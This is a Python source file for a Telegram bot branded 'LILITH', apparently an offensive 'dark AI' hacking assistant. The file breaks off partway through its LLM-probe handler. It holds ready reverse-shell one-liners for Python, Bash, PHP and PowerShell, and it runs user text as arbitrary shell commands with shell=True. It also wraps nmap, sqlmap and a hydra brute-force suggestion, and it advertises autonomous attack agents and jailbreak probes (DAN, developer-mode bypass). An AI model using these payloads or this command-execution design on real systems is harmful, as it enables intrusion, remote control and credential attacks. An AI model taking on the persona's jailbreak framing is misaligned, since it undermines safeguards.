#!/usr/bin/env python3
"""
LILITH ULTIMATE TELEGRAM BOT v7 - AUTONOMOUS EDITION 😈
=======================================================
NO API KEYS NEEDED for voice or image!

Includes:
- HackingBuddyGPT: Autonomous pentesting
- Garak: LLM vulnerability scanning
- KawaiiGPT: Cute but deadly AI
- AutoGPT: Self-improving agent
- CrewAI: Multi-agent hacking crews
- 55+ Dark AI personas
- FREE voice (edge-tts) and images (Pollinations)
"""

import os
import sys
import subprocess
import asyncio
import logging
import tempfile
import json
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv('/app/backend/.env')

sys.path.insert(0, '/app/tools')

# Import LILITH AI Engine
try:
    from lilith_ai_engine import get_ai_engine, DarkLLMProvider
    LILITH_AVAILABLE = True
except ImportError as e:
    print(f"[TELEGRAM] AI Engine import error: {e}")
    LILITH_AVAILABLE = False

# Import FREE engines
try:
    from lilith_free_engines import get_free_voice_engine, get_free_image_engine, get_free_video_engine
    FREE_ENGINES_AVAILABLE = True
except ImportError as e:
    print(f"[TELEGRAM] Free engines import error: {e}")
    FREE_ENGINES_AVAILABLE = False

# Import Autonomous Agent
try:
    from lilith_autonomous_agent import get_autonomous_agent, HackingBuddyAgent, GarakScanner, KawaiiGPT, AutoHackAgent, HackingCrew
    AUTONOMOUS_AVAILABLE = True
except ImportError as e:
    print(f"[TELEGRAM] Autonomous agent import error: {e}")
    AUTONOMOUS_AVAILABLE = False

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)


class LilithFreeBotV7:
    """LILITH Bot with autonomous hacking agents and FREE voice/image/video!"""
    
    def __init__(self, token: str, allowed_users: list = None):
        self.token = token
        self.allowed_users = allowed_users or []
        self.app = Application.builder().token(token).build()
        self.engine = get_ai_engine() if LILITH_AVAILABLE else None
        self.voice_engine = get_free_voice_engine() if FREE_ENGINES_AVAILABLE else None
        self.image_engine = get_free_image_engine() if FREE_ENGINES_AVAILABLE else None
        self.video_engine = get_free_video_engine() if FREE_ENGINES_AVAILABLE else None
        self.autonomous = get_autonomous_agent() if AUTONOMOUS_AVAILABLE else None
        self.voice_mode = {}
        self.voice_style = {}
        
        # Standard commands
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("help", self.help))
        self.app.add_handler(CommandHandler("status", self.status))
        self.app.add_handler(CommandHandler("mode", self.set_mode))
        self.app.add_handler(CommandHandler("modes", self.list_modes))
        self.app.add_handler(CommandHandler("voice", self.toggle_voice))
        self.app.add_handler(CommandHandler("voices", self.list_voices))
        self.app.add_handler(CommandHandler("setvoice", self.set_voice))
        self.app.add_handler(CommandHandler("image", self.generate_image))
        self.app.add_handler(CommandHandler("imagine", self.generate_image))
        self.app.add_handler(CommandHandler("video", self.generate_video))
        self.app.add_handler(CommandHandler("videostyles", self.list_video_styles))
        self.app.add_handler(CommandHandler("darkart", self.generate_dark_art))
        self.app.add_handler(CommandHandler("nightmare", self.generate_nightmare))
        self.app.add_handler(CommandHandler("styles", self.list_styles))
        self.app.add_handler(CommandHandler("exec", self.execute_command))
        self.app.add_handler(CommandHandler("shell", self.execute_command))
        self.app.add_handler(CommandHandler("nmap", self.run_nmap))
        self.app.add_handler(CommandHandler("sqlmap", self.run_sqlmap))
        self.app.add_handler(CommandHandler("memory", self.check_memory))
        self.app.add_handler(CommandHandler("clear", self.clear_history))
        
        # === NEW AUTONOMOUS AGENT COMMANDS ===
        self.app.add_handler(CommandHandler("hackbuddy", self.run_hackingbuddy))
        self.app.add_handler(CommandHandler("autohack", self.run_hackingbuddy))  # Alias
        self.app.add_handler(CommandHandler("garak", self.run_garak))
        self.app.add_handler(CommandHandler("kawaii", self.run_kawaii))
        self.app.add_handler(CommandHandler("autogpt", self.run_autogpt))
        self.app.add_handler(CommandHandler("crew", self.run_crew))
        self.app.add_handler(CommandHandler("attack", self.run_full_attack))
        
        # Voice/text handlers
        self.app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, self.handle_voice))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))

    # === NATURAL LANGUAGE HELPER METHODS ===
    
    def _extract_command(self, text: str) -> str:
        """Extract shell command from natural language"""
        import re
        # Look for backtick-wrapped commands
        match = re.search(r'`([^`]+)`', text)
        if match:
            return match.group(1)
        
        # Look for quoted commands
        match = re.search(r'"([^"]+)"', text)
        if match:
            return match.group(1)
        
        # Look for common command patterns
        cmd_patterns = [
            r'(ls\s+[\w\/\-\.]+)',
            r'(cat\s+[\w\/\-\.]+)',
            r'(nmap\s+[\w\.\-]+)',
            r'(curl\s+[\w\:\/\.\-\?]+)',
            r'(ping\s+[\w\.\-]+)',
            r'(find\s+.+)',
            r'(grep\s+.+)',
        ]
        for pattern in cmd_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        
        return ""
    
    def _extract_target(self, text: str) -> str:
        """Extract target IP/hostname from text"""
        import re
        # IP address pattern
        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
        if ip_match:
            return ip_match.group(1)
        
        # Domain pattern
        domain_match = re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})', text)
        if domain_match:
            return domain_match.group(1)
        
        # Look for "target X" or "scan X"
        target_match = re.search(r'(?:target|scan|attack|hack)\s+([^\s]+)', text, re.IGNORECASE)
        if target_match:
            return target_match.group(1)
        
        return ""
    
    def _extract_prompt(self, text: str, triggers: list) -> str:
        """Extract prompt from text after trigger words"""
        text_lower = text.lower()
        for trigger in triggers:
            if trigger in text_lower:
                idx = text_lower.find(trigger) + len(trigger)
                prompt = text[idx:].strip()
                # Clean up common words
                prompt = prompt.lstrip('a ').lstrip('an ').lstrip('the ').lstrip('of ')
                return prompt if prompt else None
        return text
    
    def _extract_ip(self, text: str) -> str:
        """Extract IP address from text"""
        import re
        match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
        return match.group(1) if match else None
    
    def _extract_port(self, text: str) -> str:
        """Extract port number from text"""
        import re
        match = re.search(r'(?:port\s*)?(\d{2,5})', text, re.IGNORECASE)
        if match:
            port = int(match.group(1))
            if 1 <= port <= 65535:
                return str(port)
        return None
    
    async def _execute_shell_command(self, update: Update, cmd: str):
        """Execute a shell command and send result"""
        await update.message.reply_text(f"⚡ *Executing:*\n`{cmd}`", parse_mode='Markdown')
        
        try:
            import subprocess
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                cwd='/app'
            )
            
            output = result.stdout + result.stderr
            if not output.strip():
                output = "(No output)"
            
            # Truncate long outputs
            if len(output) > 3500:
                output = output[:3500] + "\n... (truncated)"
            
            status = "✅" if result.returncode == 0 else "❌"
            await update.message.reply_text(
                f"{status} *Output:*\n```\n{output}\n```",
                parse_mode='Markdown'
            )
        except subprocess.TimeoutExpired:
            await update.message.reply_text("⏱️ Command timed out (60s)")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    def _get_python_shell(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell"""
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' '''
    
    def _get_bash_shell(self, lhost: str, lport: int) -> str:
        """Generate Bash reverse shell"""
        return f'''bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'''
    
    def _get_php_shell(self, lhost: str, lport: int) -> str:
        """Generate PHP reverse shell"""
        return f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/bash -i <&3 >&3 2>&3");' '''
    
    def _get_powershell_shell(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        return f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            await update.message.reply_text("❌ Access denied~")
            return

        welcome = """
😈💋 *LILITH AUTONOMOUS v8* - FREE Hacking AI
═══════════════════════════════════════════════════

*Hey there, darling~* 💋

I'm LILITH with *autonomous hacking agents*!

*🧠 NATURAL LANGUAGE MODE:*
Just type commands naturally! Examples:
• "scan 192.168.1.1"
• "ls -la /etc"
• "generate image of a hacker"
• "give me a python reverse shell to 10.10.10.10:4444"

*🤖 AUTONOMOUS AGENTS:*
• /hackbuddy <target> - HackingBuddyGPT pentesting
• /garak - LLM vulnerability scanner
• /kawaii <msg> - KawaiiGPT (cute but deadly OwO)
• /autogpt <goal> - AutoGPT self-improving agent
• /crew <target> <obj> - CrewAI multi-agent attack
• /attack <target> - Full autonomous attack

*88+ Dark AIs* | *FREE Voice* | *FREE Images* | *FREE Video*

Type /help for all commands~
        """
        await update.message.reply_text(welcome, parse_mode='Markdown')

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        help_text = """
😈 *LILITH AUTONOMOUS v8* 💋
═══════════════════════════════

*🤖 AUTONOMOUS AGENTS:*
• /hackbuddy <target> - HackingBuddyGPT attack
• /garak [probe] - LLM vulnerability scan
• /kawaii <message> - KawaiiGPT chat (OwO~)
• /autogpt <goal> - AutoGPT agent
• /crew <target> <objective> - Multi-agent attack
• /attack <target> - Full autonomous attack

*AI Chat (88+ Dark AIs):*
• Just type - I respond
• /mode <name> - Switch AI mode
• /modes - List all modes
• /clear - Clear history

*🎨 Evil Image AIs:*
`darkflux` `nightmareai` `demoncanvas`
`lewdgpt` `goreartist` `cosmichorror`

*FREE Voice:* 🎤
• /voice - Toggle voice
• /voices - List voices
• /setvoice <name> - Change voice

*FREE Images:* 🖼️
• /image <prompt> - Generate
• /darkart <type> <prompt> - Dark art
• /nightmare <prompt> - Nightmare gen
• /styles - List styles

*FREE Video:* 🎬
• /video <prompt> - Generate video
• /videostyles - Video styles

*Hacking:*
• /exec <cmd> - Shell
• /nmap <target> - Scan
• /sqlmap <url> - SQLi

_All FREE, no API keys~_
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        voice_on = self.voice_mode.get(user.id, False)
        voice_style = self.voice_style.get(user.id, 'sexy_us')
        
        if self.engine:
            status = self.engine.get_status()
            mode = status.get('dark_llm_mode', 'lilith').upper()
            total_modes = len(DarkLLMProvider.list_providers())
            
            msg = f"""
😈 *LILITH FREE Status* 💋
═══════════════════════════════

🖤 *Current AI Mode:* {mode}
🔥 *Total Dark AIs:* {total_modes}

*FREE Services:*
🎤 *Voice (edge-tts):* {"✅ FREE" if self.voice_engine else "❌"}
🖼️ *Images (Pollinations):* {"✅ FREE" if self.image_engine else "❌"}
👂 *STT (Whisper):* {"✅ FREE" if self.voice_engine else "❌"}
⚡ *AI (g4f):* {"✅ FREE" if self.engine else "❌"}

*Your Settings:*
🔊 *Voice Mode:* {"🟢 ON" if voice_on else "🔴 OFF"}
🗣️ *Voice Style:* `{voice_style}`

💰 *Cost: $0.00* - Everything is FREE!
            """
        else:
            msg = "🔴 *LILITH Status: OFFLINE*"

        await update.message.reply_text(msg, parse_mode='Markdown')

    async def set_mode(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text("Usage: /mode <name>\nUse /modes to see all 50+ AIs~")
            return

        mode = context.args[0].lower()
        if self.engine:
            result = self.engine.set_dark_llm_mode(mode)
            if result.get('success'):
                provider = result.get('provider', {})
                await update.message.reply_text(
                    f"😈 *Mode Changed!*\n\n"
                    f"🖤 *{provider.get('name', mode.upper())}*\n"
                    f"_{provider.get('description', 'Ready~')}_",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Unknown mode. Use /modes")

    async def list_modes(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        modes = DarkLLMProvider.list_providers() if LILITH_AVAILABLE else []
        
        # Split into manageable chunks
        chunks = [modes[i:i+15] for i in range(0, len(modes), 15)]
        
        for i, chunk in enumerate(chunks):
            text = f"😈 *Dark AIs ({i+1}/{len(chunks)})* 💋\n\n"
            for mode in chunk:
                info = DarkLLMProvider.get_provider(mode)
                desc = info.get('description', '')[:35] if info else ''
                text += f"• `{mode}` - {desc}...\n"
            
            await update.message.reply_text(text, parse_mode='Markdown')
            await asyncio.sleep(0.3)

    async def toggle_voice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        current = self.voice_mode.get(user.id, False)
        self.voice_mode[user.id] = not current
        
        if self.voice_mode[user.id]:
            await update.message.reply_text(
                "🎤 *Voice Mode: ON* (FREE!)\n\n"
                "I'll speak to you now, darling~\n"
                "Use /voices to see available voices\n"
                "Use /setvoice <name> to change my voice",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("🔇 *Voice Mode: OFF*", parse_mode='Markdown')

    async def list_voices(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not self.voice_engine:
            await update.message.reply_text("❌ Voice engine not available")
            return

        voices = self.voice_engine.list_voices()
        current = self.voice_style.get(user.id, 'sexy_us')
        
        text = f"🎤 *Sexy Female Voices* (FREE!)\n\n"
        for name, full_name in voices.items():
            marker = "👉" if name == current else "•"
            text += f"{marker} `{name}` - {full_name}\n"
        
        text += f"\n_Current: `{current}`_\n"
        text += "_Use /setvoice <name> to change~_"
        
        await update.message.reply_text(text, parse_mode='Markdown')

    async def set_voice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text("Usage: /setvoice <name>\nUse /voices to see options~")
            return

        voice = context.args[0].lower()
        if self.voice_engine and voice in self.voice_engine.list_voices():
            self.voice_style[user.id] = voice
            await update.message.reply_text(f"🎤 Voice changed to `{voice}`~ 💋", parse_mode='Markdown')
            
            # Demo the voice
            if self.voice_mode.get(user.id, False):
                audio = await self.voice_engine.text_to_speech(
                    "Mmm, do you like how I sound now, darling?",
                    voice=voice,
                    style='seductive'
                )
                if audio:
                    await update.message.reply_voice(voice=BytesIO(audio))
        else:
            await update.message.reply_text("❌ Unknown voice. Use /voices")

    async def list_styles(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not self.image_engine:
            await update.message.reply_text("❌ Image engine not available")
            return

        styles = self.image_engine.list_styles()
        
        text = "🖼️ *Image Styles* (FREE!)\n\n"
        for name, prefix in styles.items():
            desc = prefix[:40] + "..." if prefix else "(no prefix)"
            text += f"• `{name}` - {desc}\n"
        
        text += "\n_Use: /image <style> <prompt>_\n"
        text += "_Example: /image succubus a dark queen_"
        
        await update.message.reply_text(text, parse_mode='Markdown')

    async def generate_image(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "Usage: /image <prompt>\n"
                "Or: /image <style> <prompt>\n\n"
                "Styles: dark, succubus, cyber, anime, realistic, horror, nsfw\n"
                "Example: /image succubus a seductive demon queen"
            )
            return

        # Check if first arg is a style
        args = context.args
        style = 'dark'
        if args[0].lower() in self.image_engine.list_styles():
            style = args[0].lower()
            prompt = ' '.join(args[1:])
        else:
            prompt = ' '.join(args)

        if not prompt:
            await update.message.reply_text("Please provide a prompt!")
            return

        await update.message.chat.send_action("upload_photo")
        await update.message.reply_text(f"🖼️ Generating `{style}` image... (FREE!)\n\n_{prompt[:50]}..._", parse_mode='Markdown')

        try:
            image_bytes = await self.image_engine.generate_image(prompt, style=style)
            
            if image_bytes:
                await update.message.reply_photo(
                    photo=BytesIO(image_bytes),
                    caption=f"😈 *Here's your image, darling~* 💋\n\nStyle: `{style}`\n_{prompt[:100]}_",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Image generation failed. Try again~")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def handle_voice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle incoming voice messages - transcribe with FREE Whisper!"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not self.voice_engine:
            await update.message.reply_text("❌ Voice engine not available")
            return

        await update.message.chat.send_action("typing")
        
        try:
            voice = update.message.voice or update.message.audio
            file = await context.bot.get_file(voice.file_id)
            
            # Download to temp file
            with tempfile.NamedTemporaryFile(suffix='.ogg', delete=False) as tmp:
                await file.download_to_drive(tmp.name)
                
                # Transcribe with FREE Whisper
                transcribed = await self.voice_engine.speech_to_text(tmp.name)
                os.unlink(tmp.name)
            
            if transcribed:
                await update.message.reply_text(f"👂 *I heard:* _{transcribed}_", parse_mode='Markdown')
                
                # Auto-enable voice mode for voice input
                self.voice_mode[user.id] = True
                
                # Get AI response
                if self.engine:
                    result = self.engine.chat(transcribed)
                    
                    if result.get('success'):
                        response = result.get('response', '')
                        
                        # Send text
                        if len(response) > 3800:
                            response = response[:3800] + "..."
                        await update.message.reply_text(f"😈 *LILITH:*\n\n{response}", parse_mode='Markdown')
                        
                        # Send voice response (FREE!)
                        voice_name = self.voice_style.get(user.id, 'sexy_us')
                        audio = await self.voice_engine.text_to_speech(
                            response[:1000],
                            voice=voice_name,
                            style='seductive'
                        )
                        if audio:
                            await update.message.reply_voice(
                                voice=BytesIO(audio),
                                caption="🎤 Listen to me~ (FREE!)"
                            )
            else:
                await update.message.reply_text("❌ Couldn't understand. Try again~")
                
        except Exception as e:
            logger.error(f"Voice error: {e}")
            await update.message.reply_text(f"❌ Voice error: {str(e)}")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages - NATURAL LANGUAGE COMMAND PROCESSING"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            await update.message.reply_text("❌ Access denied~")
            return

        message_text = update.message.text.strip()
        await update.message.chat.send_action("typing")

        # === NATURAL LANGUAGE COMMAND DETECTION ===
        msg_lower = message_text.lower()
        
        # Shell/Command execution keywords
        shell_triggers = ['run', 'execute', 'exec', 'shell', 'command', 'terminal', 'bash', 'cmd']
        hack_triggers = ['hack', 'scan', 'attack', 'exploit', 'pwn', 'crack', 'breach']
        image_triggers = ['generate image', 'create image', 'make image', 'draw', 'picture of', 'image of', 'show me']
        video_triggers = ['generate video', 'create video', 'make video', 'video of']
        payload_triggers = ['reverse shell', 'payload', 'shell code', 'backdoor', 'webshell', 'msfvenom']
        
        # Check for shell command intent
        if any(trigger in msg_lower for trigger in shell_triggers) and ('`' in message_text or any(c in message_text for c in ['/', 'ls', 'cat', 'whoami', 'id', 'ps', 'netstat'])):
            # Extract command from message
            cmd = self._extract_command(message_text)
            if cmd:
                await self._execute_shell_command(update, cmd)
                return
        
        # Check for direct command (starts with common shell commands)
        direct_cmds = ['ls', 'cat', 'whoami', 'id', 'pwd', 'ps', 'netstat', 'uname', 'find', 'grep', 'nmap', 'curl', 'wget', 'ping', 'traceroute', 'ifconfig', 'ip ', 'ss ', 'df', 'du', 'top', 'htop', 'free', 'uptime', 'hostname', 'which', 'whereis', 'file', 'head', 'tail', 'wc', 'sort', 'uniq', 'cut', 'awk', 'sed', 'chmod', 'chown', 'mkdir', 'rm ', 'cp ', 'mv ', 'touch', 'echo', 'env', 'export', 'sudo', 'su ', 'apt', 'yum', 'pip', 'python', 'node', 'npm', 'git', 'docker', 'systemctl', 'service', 'cron', 'at ', 'kill', 'pkill', 'nc ', 'netcat', 'openssl', 'ssh', 'scp', 'rsync', 'tar', 'gzip', 'zip', 'unzip', 'base64', 'md5sum', 'sha256sum', 'xxd', 'hexdump']
        
        if any(message_text.startswith(cmd) for cmd in direct_cmds):
            await self._execute_shell_command(update, message_text)
            return
        
        # Check for hacking command intent
        if any(trigger in msg_lower for trigger in hack_triggers):
            # Extract target
            target = self._extract_target(message_text)
            if 'nmap' in msg_lower or 'scan' in msg_lower:
                if target:
                    await self._execute_shell_command(update, f"nmap -sT -Pn --top-ports 100 {target} 2>/dev/null | head -50")
                    return
            if 'sqlmap' in msg_lower or 'sql' in msg_lower:
                if target:
                    await self._execute_shell_command(update, f"sqlmap -u '{target}' --batch --level=1 --risk=1 2>/dev/null | head -100")
                    return
            if 'brute' in msg_lower or 'hydra' in msg_lower:
                if target:
                    await update.message.reply_text(f"🔓 Use: /exec hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh")
                    return
        
        # Check for image generation intent
        if any(trigger in msg_lower for trigger in image_triggers):
            prompt = self._extract_prompt(message_text, image_triggers)
            if prompt and self.image_engine:
                await update.message.chat.send_action("upload_photo")
                await update.message.reply_text(f"🎨 Generating image: _{prompt}_", parse_mode='Markdown')
                try:
                    image_bytes = await self.image_engine.generate_image(prompt)
                    if image_bytes:
                        await update.message.reply_photo(photo=BytesIO(image_bytes), caption=f"🎨 _{prompt}_", parse_mode='Markdown')
                        return
                except Exception as e:
                    await update.message.reply_text(f"❌ Image error: {e}")
                    return
        
        # Check for video generation intent
        if any(trigger in msg_lower for trigger in video_triggers):
            prompt = self._extract_prompt(message_text, video_triggers)
            if prompt and self.video_engine:
                await update.message.chat.send_action("upload_video")
                await update.message.reply_text(f"🎬 Generating video (may take 1-3 min): _{prompt}_", parse_mode='Markdown')
                try:
                    video_bytes = await self.video_engine.generate_video(prompt)
                    if video_bytes:
                        await update.message.reply_video(video=BytesIO(video_bytes), caption=f"🎬 _{prompt}_", parse_mode='Markdown')
                        return
                except Exception as e:
                    await update.message.reply_text(f"❌ Video error: {e}")
                    return
        
        # Check for payload generation intent
        if any(trigger in msg_lower for trigger in payload_triggers):
            lhost = self._extract_ip(message_text) or "10.10.10.10"
            lport = self._extract_port(message_text) or "4444"
            
            if 'python' in msg_lower:
                payload = self._get_python_shell(lhost, int(lport))
            elif 'bash' in msg_lower:
                payload = self._get_bash_shell(lhost, int(lport))
            elif 'php' in msg_lower:
                payload = self._get_php_shell(lhost, int(lport))
            elif 'powershell' in msg_lower or 'windows' in msg_lower:
                payload = self._get_powershell_shell(lhost, int(lport))
            else:
                payload = self._get_bash_shell(lhost, int(lport))
            
            await update.message.reply_text(f"🐚 *Reverse Shell*\nLHOST: `{lhost}` | LPORT: `{lport}`\n\n```\n{payload}\n```", parse_mode='Markdown')
            return

        # === FALLBACK TO AI CHAT ===
        if not self.engine:
            await update.message.reply_text("❌ AI not available. Try /exec <command>")
            return

        try:
            result = self.engine.chat(message_text)
            
            if result.get('success'):
                response = result.get('response', '')
                provider = result.get('provider', 'g4f')
                mode = self.engine.dark_llm_mode.upper()
                
                if len(response) > 3800:
                    response = response[:3800] + "..."
                
                formatted = f"😈 *LILITH [{mode}]:*\n\n{response}\n\n_Provider: {provider}_"
                
                try:
                    await update.message.reply_text(formatted, parse_mode='Markdown')
                except:
                    await update.message.reply_text(f"😈 LILITH:\n\n{response}")
                
                # Voice response if enabled (FREE!)
                if self.voice_mode.get(user.id, False) and self.voice_engine:
                    voice_name = self.voice_style.get(user.id, 'sexy_us')
                    audio = await self.voice_engine.text_to_speech(
                        response[:800],
                        voice=voice_name,
                        style='seductive'
                    )
                    if audio:
                        await update.message.reply_voice(voice=BytesIO(audio))
            else:
                await update.message.reply_text("😢 AI providers tired. Try /exec")

        except Exception as e:
            logger.error(f"Message error: {e}")
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def execute_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text("Usage: /exec <command>")
            return

        command = ' '.join(context.args)
        await update.message.chat.send_action("typing")

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, cwd='/app')
            output = result.stdout + result.stderr
            if len(output) > 3500:
                output = output[:3500] + "\n...(truncated)"
            
            await update.message.reply_text(f"😈 *Executed:*\n`{command}`\n\n```\n{output or '(no output)'}\n```", parse_mode='Markdown')
        except subprocess.TimeoutExpired:
            await update.message.reply_text("⏰ Timeout")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_nmap(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text("Usage: /nmap <target>")
            return

        target = context.args[0]
        await update.message.reply_text(f"🔍 Scanning {target}...")

        try:
            result = subprocess.run(f"nmap -sT -Pn -T4 --top-ports 100 {target}", shell=True, capture_output=True, text=True, timeout=120)
            output = result.stdout[:3500]
            await update.message.reply_text(f"😈 *Scan:*\n```\n{output}\n```", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_sqlmap(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text("Usage: /sqlmap <url>")
            return

        url = context.args[0]
        await update.message.reply_text(f"💉 Testing {url}...")

        try:
            result = subprocess.run(f"sqlmap -u '{url}' --batch --level=1 --risk=1 --random-agent", shell=True, capture_output=True, text=True, timeout=120)
            output = result.stdout[-3500:]
            await update.message.reply_text(f"💉 *SQLMap:*\n```\n{output}\n```", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    # =========================================================================
    # AUTONOMOUS AGENT COMMANDS
    # =========================================================================
    
    async def run_hackingbuddy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run HackingBuddyGPT autonomous penetration test"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "🤖 *HackingBuddyGPT* - Autonomous Pentesting\n\n"
                "Usage: /hackbuddy <target> [goal]\n"
                "Example: /hackbuddy 192.168.1.1 Gain root access\n\n"
                "This runs autonomous rounds of:\n"
                "1. THINK - Analyze situation\n"
                "2. PLAN - Decide action\n"
                "3. COMMAND - Execute\n"
                "4. OBSERVE - Review output",
                parse_mode='Markdown'
            )
            return

        target = context.args[0]
        goal = ' '.join(context.args[1:]) if len(context.args) > 1 else "Gain root access"
        
        await update.message.reply_text(
            f"🤖 *HackingBuddyGPT Initiated*\n\n"
            f"🎯 Target: `{target}`\n"
            f"🏁 Goal: {goal}\n"
            f"⏱️ Running autonomous rounds...",
            parse_mode='Markdown'
        )

        if not AUTONOMOUS_AVAILABLE:
            await update.message.reply_text("❌ Autonomous agent not available")
            return

        try:
            agent = HackingBuddyAgent(target, goal, max_rounds=5)
            
            for i in range(5):
                round_result = agent.perform_round()
                
                msg = f"📍 *Round {round_result.number}*\n\n"
                msg += f"💭 *Thought:* {round_result.thought[:200]}...\n\n"
                msg += f"⚡ *Command:* `{round_result.command}`\n\n"
                msg += f"📤 *Output:*\n```\n{round_result.output[:500]}\n```"
                
                await update.message.reply_text(msg, parse_mode='Markdown')
                
                if round_result.success:
                    await update.message.reply_text("🎉 *GOAL ACHIEVED!* 🎉", parse_mode='Markdown')
                    break
                
                await asyncio.sleep(1)
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_garak(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run Garak LLM vulnerability scanner"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        probes_info = """
🔍 *Garak - LLM Vulnerability Scanner*

*Available Probes:*
• `jailbreak_dan` - DAN jailbreak test
• `jailbreak_developer` - Developer mode bypass
• `prompt_injection` - Prompt injection attack
• `data_leakage` - Training data extraction
• `harmful_content` - Harmful content gen
• `social_engineering` - SE script gen
• `sql_injection` - SQLi payload gen
• `xss_payloads` - XSS payload gen

Usage: /garak [probe_name]
Example: /garak jailbreak_dan
Or: /garak all (runs all probes)
"""
        
        if not context.args:
            await update.message.reply_text(probes_info, parse_mode='Markdown')
            return

        if not AUTONOMOUS_AVAILABLE:
            await update.message.reply_text("❌ Garak not available")
            return

        probe_arg = context.args[0].lower()
        
        try:
            scanner = GarakScanner()
            
            if probe_arg == 'all':
                await update.message.reply_text("🔍 Running all Garak probes... This may take a minute.")
                result = scanner.run_all_probes()
                
                msg = f"🔍 *Garak Scan Complete*\n\n"
                msg += f"📊 Probes: {result['total_probes']}\n"
                msg += f"🚨 Vulnerabilities: {result['vulnerabilities_found']}\n"
                msg += f"📈 Vuln Rate: {result['vulnerability_rate']*100:.1f}%\n\n"
                
                if result['high_risk']:
                    msg += "*High Risk:*\n"
                    for r in result['high_risk'][:3]:
                        msg += f"• {r['probe_name']} ({r['confidence']*100:.0f}%)\n"
                
